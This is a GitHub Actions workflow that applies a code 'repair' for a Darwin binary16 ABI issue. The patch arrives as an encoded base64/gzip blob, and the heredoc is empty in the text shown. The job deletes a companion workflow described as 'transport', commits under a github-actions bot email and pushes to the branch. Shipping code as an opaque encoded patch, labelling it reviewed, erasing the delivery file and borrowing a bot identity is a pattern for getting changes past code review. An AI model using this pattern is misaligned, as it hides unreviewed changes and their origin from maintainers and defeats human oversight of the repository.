name: Issue 672 Darwin ABI repair

on:
  push:
    branches: [fix/672-binary16-codegen]

permissions:
  contents: write

jobs:
  apply:
    runs-on: ubuntu-26.04
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
      - name: Apply reviewed repair and remove transport
        shell: bash
        run: |
          set -euo pipefail
          cat > "$RUNNER_TEMP/issue672.patch.gz.b64" <<'PATCH_EOF'
          
          PATCH_EOF
          sed -i 's/^          //' "$RUNNER_TEMP/issue672.patch.gz.b64"
          base64 -d "$RUNNER_TEMP/issue672.patch.gz.b64" | gzip -d > "$RUNNER_TEMP/issue672.patch"
          patch -p1 < "$RUNNER_TEMP/issue672.patch"
          rm .github/workflows/issue-672-source-snapshot.yml
          printf 'temporary CI trigger; remove in the next connector commit\n' > .github/issue-672-ci-trigger
          git config user.name 'Issue 672 integration'
          git config user.email '41898282+github-actions[bot]@users.noreply.github.com'
          git add -A
          git diff --cached --check
          git commit -m 'codegen: repair Darwin binary16 ABI'
          git push origin HEAD:fix/672-binary16-codegen
